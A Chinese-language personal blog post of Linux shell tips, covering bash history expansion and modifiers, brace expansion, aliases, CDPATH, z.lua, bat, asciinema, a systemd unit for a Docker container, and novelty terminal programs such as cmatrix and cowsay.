+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 利用 !<span class="number">-2</span>，我经常使用的一个场景是，先用文本编辑器编辑源代码，接着再编 译源代码。如果我需要再次编辑和编译，那么只要反复执行 !<span class="number">-2</span> 即可。如此不 断循环。</span><br><span class="line">nvim first.c </span><br><span class="line">gcc -o first first.c </span><br><span class="line">!<span class="number">-2</span> # 再编辑 </span><br><span class="line">!<span class="number">-2</span> # 再编译</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20102.png" alt></p>
+<h2 id="和"><a class="markdownIt-Anchor" href="#和">#</a> !$ 和！^</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">!$，它允许我直接复用上一条命令的最后一位参数</span></span><br><span class="line">mkdir videos </span><br><span class="line">cd !$</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">与最后一位参数相反，!ˆ 能够让我们引用上一条命令中最开头的参数</span></span><br><span class="line">ls /usr/share/doc /usr/share/man </span><br><span class="line">cd !ˆ</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20103.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 要引用的是上一条命令的所有参数。</span><br><span class="line">ls src code </span><br><span class="line">cp -r !*</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20104.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 对于引用上一条命令中的参数，我们甚至可以要求 Shell 精确到具体的第几个。</span><br><span class="line">touch foo.txt bar.txt baz.txt </span><br><span class="line">cat !:<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20105.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 引用从 m 到 n 的参数</span><br><span class="line">touch foo.txt bar.txt baz.txt </span><br><span class="line">cat !:<span class="number">1</span><span class="number">-2</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20106.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 引用从 n 到最后的参数</span><br><span class="line"># 此处的 !:<span class="number">2</span>* 允许我将 hosts 和 hostname 同时打开进行编辑。</span><br><span class="line">cat /etc/resolv.conf /etc/hosts /etc/hostname </span><br><span class="line">cat !:<span class="number">2</span>*</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20107.png" alt></p>
+<h2 id="-3"><a class="markdownIt-Anchor" href="#-3">#</a> !$</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">:h 为修饰符，意味着截取路径的开头部分(<span class="built_in">head</span>)</span></span><br><span class="line">ls ~/Downloads/test/resource</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">!$:h可获取前一部分路径</span></span><br><span class="line">cd !$:h</span><br><span class="line">cd ~/Downloads/test/</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过 :t 修饰符，我们可以引用路径的结尾部分(<span class="built_in">tail</span>)</span></span><br><span class="line">wget http://nginx.org/download/nginx-1.15.8.tar.gz </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">经过 !$:t 引用后，我们的命令变成了</span></span><br><span class="line">tar zxvf !$:t</span><br><span class="line">tar zxvf nginx-1.15.8.tar.gz</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20108.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 对于存在文件名的情形，可以利用 :r 修饰符来只引用文件名部分（这将排除掉扩展名）。例</span><br><span class="line">unzip hello.zip </span><br><span class="line">cd !$:r</span><br><span class="line"># 这里的 !$:r 将 hello.zip 去掉扩展名，只保留 hello 部分。</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20109.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Shell 还支持将多个修饰符进行联用，在它们之间只需使用冒号分隔即可。例如：</span><br><span class="line">ls ~/Downloads/test/resource</span><br><span class="line">echo !$:t:u </span><br><span class="line">echo TRUETYPE</span><br><span class="line"># 先用 :t 引用了路径的结尾部分，然后又使用 :u 将其更改为了大写字母。</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20110.png" alt></p>
+<h2 id="emacs"><a class="markdownIt-Anchor" href="#emacs">#</a> Emacs —</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bash 和 zsh 两个都支持使用 <span class="built_in">set</span> 指令来设置命令行编辑模式</span></span><br><span class="line">set -o vi</span><br><span class="line">set -o emacs</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在命令行输入一些字符</span><br><span class="line">Ctrl + b 向左移动一个字符 </span><br><span class="line">Ctrl + f 往右移动一个字符 </span><br><span class="line">Ctrl + d 删除光标右边的字符 </span><br><span class="line">退格键 删除光标左边的字符 </span><br><span class="line">Ctrl + t 将光标左边的两个字符交换顺序</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 按键作用</span><br><span class="line">Ctrl + a  将光标移到行首(最左边)</span><br><span class="line">Ctrl + e  将光标移到行尾(最右边)</span><br><span class="line">Ctrl + k  从光标处往右删除至行尾</span><br><span class="line">Ctrl + u  从光标处向左删除至行首</span><br></pre></td></tr></table></figure>
+<h2 id="tree"><a class="markdownIt-Anchor" href="#tree">#</a> tree</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只显示目录，不显示文件</span></span><br><span class="line">tree -d -L 2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示深度为2级</span></span><br><span class="line">tree -L 2</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20111.png" alt></p>
+<h2 id="echo"><a class="markdownIt-Anchor" href="#echo">#</a> echo</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bash脚本中设置文本不换行</span></span><br><span class="line">echo -n &quot;gL2JqktKqFbkyUM4&quot; &gt; 111.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20112.png" alt></p>
+<h2 id="cdpath"><a class="markdownIt-Anchor" href="#cdpath">#</a> CDPATH</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用<span class="variable">$CDPATH</span>，我们能够将常用的目录保存起来，以便 <span class="built_in">cd</span> 为我们直接转到这些目录</span></span><br><span class="line">CDPATH=:~:~/Public/23:~/Public/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加到 <span class="variable">$CDPATH</span> 路径列表的目录为待导航的目标目录 的父目录</span></span><br><span class="line">cd 22</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20113.png" alt></p>
+<h2 id="alias"><a class="markdownIt-Anchor" href="#alias">#</a> alias</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置别名，方便通过简易名称使用命令</span></span><br><span class="line">alias ..=&#x27;cd ..&#x27;</span><br><span class="line">alias ...=&#x27;cd ../..&#x27;</span><br><span class="line">alias ....=&#x27;cd ../../..&#x27;</span><br><span class="line">alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">alias l=&#x27;ls -lah --color=auto&#x27;</span><br><span class="line">alias la=&#x27;ls -AF --color=auto&#x27;</span><br><span class="line">alias ll=&#x27;ls -lFh --color=auto&#x27;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20114.png" alt></p>
+<h2 id="-4"><a class="markdownIt-Anchor" href="#-4">#</a> {}</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份文件，相当于 <span class="built_in">cp</span> linpeas_linux_amd64 linpeas_linux_amd64.bak</span></span><br><span class="line">cp linpeas_linux_amd64&#123;,.bak&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩文件，相当于 tar -zcvf log.txt.tar.gz log.txt</span></span><br><span class="line">tar -zcvf linpeas_linux_amd64&#123;.tar.gz,&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20115.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 打印序列</span><br><span class="line">echo &#123;a..z&#125;</span><br><span class="line">echo &#123;<span class="number">01.</span><span class="number">.10</span>&#125;</span><br><span class="line">echo &#123;<span class="number">1.</span><span class="number">.9</span>.<span class="number">.2</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i in &#123;<span class="number">1.</span><span class="number">.9</span>.<span class="number">.2</span>&#125;;<span class="keyword">do</span> echo $i;done | pbcopy</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20116.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 批量下载文件</span><br><span class="line">wget https:<span class="comment">//linuxtoy.org/img/&#123;1..5&#125;.png -q</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20117.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 连用和嵌套</span><br><span class="line">mkdir -p <span class="number">2019</span>/&#123;<span class="number">01.</span><span class="number">.12</span>&#125;/&#123;baby,photo&#125;</span><br><span class="line">echo &#123;&#123;A..Z&#125;,&#123;a..z&#125;,&#123;<span class="number">0.</span><span class="number">.9</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20118.png" alt></p>
+<h2 id="zlua"><a class="markdownIt-Anchor" href="#zlua">#</a> z.lua</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">快速路径切换工具 z.lua</span></span><br><span class="line">which lua lua5.1 lua5.2 lua5.3</span><br><span class="line">git clone https://github.com/skywind3000/z.lua.git ~/.z.lua</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 添加到环境变量中</span><br><span class="line">eval <span class="string">&quot;$(lua ~/.z.lua/z.lua --init zsh)&quot;</span></span><br><span class="line"></span><br><span class="line"># 在默认设置下，z.lua 将所有访问的路径都保存到了 ~/.zlua 文件中</span><br><span class="line">z p</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20119.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># -i:交互模式，如果有多个匹配结果的话，那么z.lua将展示一个列表</span><br><span class="line">z -i p</span><br><span class="line"><span class="number">2</span>:  <span class="number">24</span>         /home/xx/tmp</span><br><span class="line"><span class="number">1</span>:  <span class="number">48</span>         /home/xx/prj</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -b:这个选项在深层次目录中跳转特别有用，它可以将我们快速带回某一级的父目录</span><br><span class="line">z -b <span class="keyword">do</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20120.png" alt></p>
+<h2 id="hstr"><a class="markdownIt-Anchor" href="#hstr">#</a> HSTR</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ctrl + r 是自带的，但是没那么好用</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令行直接输入 hh 并按回车键</span></span><br><span class="line">cd ~/cli</span><br><span class="line">xiaodong@codeland:~/cli$ hh</span><br><span class="line"></span><br><span class="line">• 下方向键或 Ctrl + n:向下移动一行</span><br><span class="line">• 上方向键或 Ctrl + p:往上移动一行</span><br><span class="line">• Ctrl + f:将命令添加到收藏夹</span><br><span class="line">• Delete 键:删除命令，根据提示按 y 将确认删除</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20121.png" alt></p>
+<h2 id="paste"><a class="markdownIt-Anchor" href="#paste">#</a> paste</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将两个文本文件按照行一一对应合并</span></span><br><span class="line">paste -d &#x27;,&#x27; deafult1.txt deafult2.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20123.png" alt></p>
+<h2 id="asciinema"><a class="markdownIt-Anchor" href="#asciinema">#</a> asciinema</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Asciinema 是一个命令行屏幕录制工具，可以帮助你记录并分享终端会话</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 asciinema</span></span><br><span class="line">brew install asciinema</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 启动屏幕录制功能</span><br><span class="line">asciinema rec</span><br><span class="line"></span><br><span class="line"># 停止录制</span><br><span class="line"># 当你完成了终端会话录制后，可以按下 Ctrl+D 或输入 `<span class="built_in">exit</span>` 命令来停止录制</span><br><span class="line"># 或者按回车上传到 asciinema.org 网站上临时存储</span><br><span class="line"></span><br><span class="line"># 本地播放 cast 文件</span><br><span class="line">asciinema play /var/folders/dt/<span class="number">4</span>tq856fn683_ytdsqbk5271c0000gn/T/tmp2n2mfpq1-ascii.cast</span><br><span class="line"></span><br><span class="line"># 上传到 Asciinema 官网上，并获取共享链接</span><br><span class="line">asciinema upload /path/to/recording.cast</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20124.png" alt><br>
+<img data-src="/N1h1l157/Linux/20125.png" alt></p>
+<h2 id="bat"><a class="markdownIt-Anchor" href="#bat">#</a> bat</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Bat 是一个类似于 <span class="built_in">cat</span> 命令的工具，可以显示带有语法高亮的文件内容。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 bat</span></span><br><span class="line">brew install bat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件内容：在终端中输入 `bat` 命令来查看文件内容。例如：</span></span><br><span class="line">bat /path/to/file.txt | less</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Bat 支持多种语言的语法高亮</span><br><span class="line">bat -l python /path/to/file.py</span><br><span class="line"></span><br><span class="line"># 查看 bat 支持的语言</span><br><span class="line">bat --<span class="built_in">list</span>-languages</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20126.png" alt></p>
+<h2 id="systemctl"><a class="markdownIt-Anchor" href="#systemctl">#</a> systemctl</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">reboot 之后自启动的 docker 容器</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编写 /etc/systemd/system/mrdoc.service</span> </span><br><span class="line">cat &gt; /etc/systemd/system/mrdoc.service &lt;&lt; EOF</span><br><span class="line">[Unit]</span><br><span class="line">Description=Docker container for mrdoc</span><br><span class="line">Requires=docker.service</span><br><span class="line">After=docker.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Restart=always</span><br><span class="line">ExecStart=/usr/bin/docker start mrdoc</span><br><span class="line">ExecStop=/usr/bin/docker stop mrdoc</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行以下命令来重新加载 Systemd 配置，并启用服务</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable mrdoc.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行以下命令来启动服务、停止、重起 mrdoc 服务</span></span><br><span class="line">systemctl stop mrdoc.service</span><br><span class="line">systemctl restart mrdoc.service</span><br><span class="line">systemctl disable mrdoc.service</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20127.png" alt></p>
+<h2 id="hwclock"><a class="markdownIt-Anchor" href="#hwclock">#</a> hwclock</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看系统时钟</span></span><br><span class="line">date</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看硬件时钟的操作：</span> </span><br><span class="line">hwclock --show</span><br><span class="line">clock --show</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置硬件时钟的操作：</span> </span><br><span class="line">hwclock --set --date=&quot;11/13/2017 09:26:00&quot;</span><br><span class="line">clock --set --date=&quot;11/13/2017 09:26:00&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">硬件时钟与系统时钟同步：</span></span><br><span class="line">hwclock --hctosys</span><br><span class="line">clock --hctosys</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20128.png" alt></p>
+<h2 id="script"><a class="markdownIt-Anchor" href="#script">#</a> script</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从2.txt文件中逐行读取内容，并将每一行的内容作为文件名创建文件</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">filename=&quot;2.txt&quot;</span><br><span class="line">while IFS= read -r line</span><br><span class="line">do</span><br><span class="line">    echo &quot;$line&quot; &gt; &quot;$line&quot;</span><br><span class="line">    echo &quot;Created file: $line&quot;</span><br><span class="line">done &lt; &quot;$filename&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="play"><a class="markdownIt-Anchor" href="#play">#</a> play</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">山羊logo 苹果logo</span> </span><br><span class="line">neofetch --ascii_distro AIX</span><br><span class="line">neofetch --ascii_distro GNU</span><br><span class="line">neofetch --ascii_distro BSD</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20130.png" alt><br>
+<img data-src="/N1h1l157/Linux/20131.png" alt><br>
+<img data-src="/N1h1l157/Linux/20132.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 抽象字体</span><br><span class="line">figlet N1h1l157.github.io</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20133.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 一句话</span><br><span class="line">fortune</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20134.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 数字矩阵</span><br><span class="line">cmatrix -a -s</span><br><span class="line">cmatrix -r</span><br><span class="line">cmatrix -m</span><br><span class="line">cmatrix -abBcfsmx -C red</span><br><span class="line">cmatrix -abcm -C green</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20135.png" alt><br>
+<img data-src="/N1h1l157/Linux/20136.png" alt><br>
+<img data-src="/N1h1l157/Linux/20137.png" alt><br>
+<img data-src="/N1h1l157/Linux/20138.png" alt><br>
+<img data-src="/N1h1l157/Linux/20139.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 火车</span><br><span class="line">sl</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20140.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 龙 logo</span><br><span class="line">cowsay -f dragon-and-cow &quot;n1h1l157&quot;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20141.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看天气</span><br><span class="line">curl wttr.in</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20142.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 图片变为终端显示</span><br><span class="line">asciiview /Users/chentuo/Public/recourses/my_image/1.png</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20143.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 贪吃蛇</span><br><span class="line">nsnake</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20144.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 数字游戏</span><br><span class="line">greed</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20145.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 跳跳车</span><br><span class="line">moon-buggy</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20146.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 资源监视器</span><br><span class="line">htop</span><br><span class="line">vtop</span><br><span class="line">gtop</span><br><span class="line">bashtop</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20147.png" alt><br>
+<img data-src="/N1h1l157/Linux/20148.png" alt><br>
+<img data-src="/N1h1l157/Linux/20149.png" alt><br>
+<img data-src="/N1h1l157/Linux/20150.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 剩余磁盘统计</span><br><span class="line">ncdu</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20151.png" alt><br>
+<img data-src="/N1h1l157/Linux/20152.png" alt></p>
+
+      <div class="tags">
+          <a href="/tags/Linux/" rel="tag"><i class="ic i-tag"></i> Linux</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-07-01 14:58:55" itemprop="dateModified" datetime="2023-07-01T14:58:55+08:00">2023-07-01</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
+        <p>支付宝</p>
